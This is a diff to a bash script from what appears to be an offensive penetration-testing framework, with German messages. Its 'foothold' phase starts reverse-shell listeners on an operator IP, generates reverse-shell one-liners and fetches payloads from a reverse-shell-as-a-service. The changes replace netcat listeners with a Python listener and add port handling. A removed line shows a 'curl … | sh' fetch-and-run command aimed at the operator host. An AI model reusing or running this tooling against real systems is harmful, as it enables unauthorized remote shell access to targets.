@@ -6,6 +6,7 @@ phase_foothold() {
   state_done 40 && { echo "[40] foothold ✓ (skip)"; return 0; }
   local lhost="${ENGAGE_LHOST:?ENGAGE_LHOST setzen (Operator-IP, vom Ziel erreichbar)}"
   local lport="${ENGAGE_LPORT:-4444}"
+  engage_reclaim_listen_port "$lport"
   local sid="p2s-$ENGAGE_SID"
   local paydir="$ENGAGE_DIR/payloads"
   mkdir -p "$paydir"
@@ -20,11 +21,15 @@ phase_foothold() {
   rs_oneliners "$lhost" "$lport" >"$paydir/oneliners.txt"
 
   local jobs=(
-    "listener|echo '[listener] warte auf Rückkanal auf $lhost:$lport'; nc -lvnp $lport"
+    "listener|python3 scripts/engage-listen.py $lport"
   )
   if [[ "${ENGAGE_RS:-on}" != "off" ]]; then
-    local rsport="${ENGAGE_RS_PORT:-4445}"
-    jobs+=("rs-raas-$rsport|echo '[rs] lukechilds reverse-shell.sh — Listener $rsport (curl $(rs_url)/$lhost:$rsport | sh)'; nc -lvnp $rsport")
+    local rsport="${ENGAGE_RS_PORT:-$((lport + 1))}"
+    if [[ "$rsport" == "$lport" ]]; then
+      rsport=$((lport + 1))
+    fi
+    engage_reclaim_listen_port "$rsport"
+    jobs+=("rs-raas-$rsport|echo '[rs] lukechilds — Listener $rsport'; python3 scripts/engage-listen.py $rsport")
     state_set 40 RS_PORT "$rsport"
     rs_fetch_payload "$lhost" "$rsport" "$paydir/r-$rsport" || true
   fi
